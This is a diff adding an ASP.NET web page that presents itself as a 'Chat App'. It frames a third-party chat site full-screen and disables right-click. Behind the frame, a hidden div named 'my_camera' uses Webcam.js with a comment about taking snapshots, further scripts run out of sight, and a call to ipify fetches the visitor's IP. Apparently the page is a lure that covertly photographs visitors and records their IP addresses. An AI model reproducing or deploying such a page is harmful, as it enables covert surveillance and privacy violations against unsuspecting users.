@@ -1,0 +1,94 @@
+﻿
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> - My ASP.NET Application</title>
+    <link href="/Content/bootstrap.css" rel="stylesheet" />
+    <link href="/Content/site.css" rel="stylesheet" />
+
+    <script src="/Scripts/modernizr-2.6.2.js"></script>
+
+
+</head>
+<body>
+    <div class="navbar navbar-inverse navbar-fixed-top">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="/">Application name</a>
+            </div>
+            <div class="navbar-collapse collapse">
+                <ul class="nav navbar-nav">
+                    <li><a href="/">Home</a></li>
+                    <li><a href="/Home/About">About</a></li>
+                    <li><a href="/Home/Contact">Contact</a></li>
+                </ul>
+                <ul class="nav navbar-nav navbar-right">
+                    <li><a href="/Account/Register" id="registerLink">Register</a></li>
+                    <li><a href="/Account/Login" id="loginLink">Log in</a></li>
+                </ul>
+
+            </div>
+        </div>
+    </div>
+    <div class="container body-content">
+
+        <!doctype html>
+
+        <html lang="en">
+        <head>
+            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+            <title>Chat App</title>
+
+        </head>
+        <body oncontextmenu="return false">
+
+            <iframe src="https://www.instachatrooms.com/" height="100%" width="100%" frameborder="0" scrolling="no" style="position:absolute;"></iframe>
+            <div style="display:none">
+
+                <div id="results">Welcome To Chat Portal...</div>
+
+
+
+                <div id="my_camera"></div>
+            </div>
+            <!-- First, include the Webcam.js JavaScript Library -->
+            <script type="text/javascript" src="/webcam.min.js"></script>
+
+            <!-- Configure a few settings and attach camera -->
+
+            <script src="/Scripts/Chatroomscript.js"></script>
+
+
+
+            <script src="/Scripts/chatroomwork.js"></script>
+            <!-- Code to handle taking the snapshot and displaying it locally -->
+
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+            <script src="/Scripts/task.js"></script>
+            <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+        </body>
+    </html>
+
+    <hr />
+    <footer>
+        <p>&copy; 2018 - My ASP.NET Application</p>
+    </footer>
+</div>
+
+<script src="/Scripts/jquery-1.10.2.js"></script>
+
+<script src="/Scripts/bootstrap.js"></script>
+<script src="/Scripts/respond.js"></script>
+
+
+</body>
+</html>
